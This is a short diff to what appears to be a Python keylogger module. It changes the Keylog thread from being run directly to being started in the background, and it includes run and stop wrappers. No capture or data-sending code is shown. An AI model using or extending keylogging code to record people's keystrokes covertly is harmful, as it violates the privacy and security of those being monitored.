@@ -37,7 +37,7 @@ class Keylog(Thread):
 logger = Keylog()
 def run():
     global logger
-    logger.run()
+    logger.start()
 def stop():
     global logger
     logger.stop()
